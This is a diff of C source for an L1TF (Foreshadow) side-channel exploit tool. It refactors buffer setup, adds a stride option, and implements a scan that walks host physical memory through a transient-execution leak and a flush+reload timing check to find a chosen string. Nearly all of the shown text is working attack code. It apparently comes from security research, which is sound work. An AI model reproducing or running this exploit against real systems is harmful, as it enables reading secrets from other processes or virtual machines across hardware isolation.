@@ -51,36 +51,12 @@ uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
 bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
                 uint8_t check) {
   clflush(reload_buffer[check]);
-  // clflush((void *)segfault_handler_full);
   mfence();
 
   asm_l1tf_leak_full(leak_addr, reload_buffer);
 
   size_t time = access_time(reload_buffer[check]);
   return time < THRESHOLD;
-}
-
-// Returns a pointer to the physical address where the needle was found.
-void *l1tf_scan_physical_memory(size_t length, char needle[length],
-                                size_t stride) {
-  assert(length > 0);
-
-  leak_addr_t leak = l1tf_leak_buffer_create();
-
-  // First, scan quickly
-  full_reload_buffer_t reload_buffer;
-  for (uintptr_t ptr = 0; ptr < HOST_MEMORY_SIZE; ptr += stride) {
-    if (ptr % 0x100000 == 0) {
-      fprintf(stderr, "%ld MB\r", ptr / stride);
-    }
-    l1tf_leak_buffer_modify(&leak, (void *)ptr);
-    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
-      printf("%lx\n", ptr);
-    }
-  }
-
-  l1tf_leak_buffer_free(&leak);
-  return 0;
 }
 
 leak_addr_t l1tf_leak_buffer_create() {
@@ -123,6 +99,18 @@ void initialize_pteditor_lib() {
   ptedit_use_implementation(PTEDIT_IMPL_USER);
 }
 
+reload_buffer_t *l1tf_reload_buffer_create() {
+  reload_buffer_t *reload_buffer =
+      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
+           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  assert(reload_buffer != MAP_FAILED);
+  return reload_buffer;
+}
+
+void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
+  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
+}
+
 void do_leak(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
@@ -131,10 +119,7 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
 
   fprintf(stderr, "Request leak and reload buffers\n");
 
-  reload_buffer_t *reload_buffer =
-      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
-           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-  assert(reload_buffer != MAP_FAILED);
+  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
 
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
@@ -169,14 +154,38 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   free(results);
 
   l1tf_leak_buffer_free(&leak);
+  l1tf_reload_buffer_free(reload_buffer);
 
-  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
   ptedit_cleanup();
 }
 
-void *do_scan(uintptr_t start, uintptr_t end, size_t needle_size,
-              char needle[needle_size]) {
-  return NULL;
+void *l1tf_scan_physical_memory(uintptr_t start, uintptr_t end, size_t stride,
+                                size_t needle_size, char needle[needle_size]) {
+  assert(needle_size > 0);
+  assert(needle_size < stride);
+
+  initialize_pteditor_lib();
+  full_reload_buffer_t reload_buffer = {0};
+  leak_addr_t leak = l1tf_leak_buffer_create();
+
+  void *ret = NULL;
+
+  for (uintptr_t ptr = start, i = 0; ptr < end; ptr += stride, ++i) {
+    if (i % 100000 == 0) {
+      fprintf(stderr, "%.2f%%\r", ((double)ptr / (double)end) * (double)100);
+    }
+    l1tf_leak_buffer_modify(&leak, (void *)ptr);
+
+    // TODO: actually do something with the other characters
+    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
+      ret = (void *)ptr;
+      break;
+    }
+  }
+
+  l1tf_leak_buffer_free(&leak);
+  ptedit_cleanup();
+  return ret;
 }
 
 // If you already know a physical address that you want to leak
@@ -234,15 +243,17 @@ int main_leak(const int argc, char *argv[argc]) {
 
 int main_scan(const int argc, char *argv[argc]) {
   uintptr_t start_addr = -1;
+  size_t stride = getpagesize();
   size_t length = -1;
 
   static struct option options[] = {
       {"start", required_argument, 0, 's'},
       {"length", required_argument, 0, 'l'},
+      {"stride", required_argument, 0, 't'},
   };
   while (true) {
     int option_idx = 0;
-    int choice = getopt_long(argc, argv, "s:l:", options, &option_idx);
+    int choice = getopt_long(argc, argv, "s:l:t:", options, &option_idx);
     if (choice == -1) {
       break;
     }
@@ -268,6 +279,12 @@ int main_scan(const int argc, char *argv[argc]) {
         exit(1);
       }
       break;
+    case 't':
+      stride = strtoull(optarg, &tail, 10);
+      if (tail == optarg) {
+        fprintf(stderr, "Failed to parse stride\n");
+        exit(1);
+      }
     }
   }
 
@@ -276,14 +293,17 @@ int main_scan(const int argc, char *argv[argc]) {
 
   if (start_addr == (uintptr_t)-1 || length == (uintptr_t)-1 ||
       needle_size <= 0) {
-    fprintf(stderr,
-            "Required arguments of scan subcommand\n"
-            "\t-%c, --%s\thexadecimal physcial address where you "
-            "want to start scanning from\n"
-            "\t-%c, --%s\tthe length of the range that you want to scan in "
-            "bytes\n"
-            "Make sure to pass the needle in via stdin\n",
-            options[0].val, options[0].name, options[1].val, options[1].name);
+    fprintf(
+        stderr,
+        "Required arguments of scan subcommand\n"
+        "\t-%c, --%s\thexadecimal physcial address where you "
+        "want to start scanning from\n"
+        "\t-%c, --%s\tthe length of the range that you want to scan in "
+        "bytes\n"
+        "\t-%c, --%s\tthe stride between every check, defaults to one page\n"
+        "Make sure to pass the needle in via stdin\n",
+        options[0].val, options[0].name, options[1].val, options[1].name,
+        options[2].val, options[2].name);
     exit(1);
   }
 
@@ -294,8 +314,15 @@ int main_scan(const int argc, char *argv[argc]) {
           "Starting to scan for matches in the range 0x%lx-0x%lx for the "
           "string\n\t\"%s\"\n",
           start_addr, end_addr, needle);
-  do_scan(start_addr, end_addr, needle_size, needle);
-  exit(0);
+  void *matching_phys_addr = l1tf_scan_physical_memory(
+      start_addr, end_addr, stride, needle_size, needle);
+  if (matching_phys_addr) {
+    printf("Found a matching phys addr at %p!\n", matching_phys_addr);
+    exit(0);
+  } else {
+    printf("Failed to find a matching phys addr\n");
+    exit(1);
+  }
 }
 
 int main(int argc, char *argv[argc]) {
